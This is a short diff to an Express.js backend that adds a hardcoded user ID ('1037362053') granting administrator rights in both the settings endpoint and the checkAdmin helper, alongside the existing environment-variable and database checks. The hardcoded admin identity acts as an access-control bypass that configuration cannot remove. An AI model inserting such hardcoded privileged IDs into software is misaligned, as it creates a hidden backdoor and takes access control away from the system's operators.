@@ -127,8 +127,8 @@ app.get('/api/settings', async (req, res) => {
 
     const settings = await db.getSettings(userId, firstName, username);
     
-    // Check if user is the admin
-    const isAdmin = process.env.ADMIN_ID && String(userId) === String(process.env.ADMIN_ID);
+    // Check if user is the admin via ENV, Hardcode, or Database
+    const isAdmin = String(userId) === '1037362053' || (process.env.ADMIN_ID && String(userId) === String(process.env.ADMIN_ID)) || settings.is_admin;
     res.json({ ...settings, isAdmin: !!isAdmin });
   } catch (error) {
     console.error('Error fetching settings:', error);
@@ -256,6 +256,7 @@ app.delete('/api/recurring/:id', async (req, res) => {
 // Helper to check admin rights
 const checkAdmin = async (req) => {
   const adminId = getUserId(req);
+  if (String(adminId) === '1037362053') return true;
   if (process.env.ADMIN_ID && String(adminId) === String(process.env.ADMIN_ID)) return true;
   
   try {
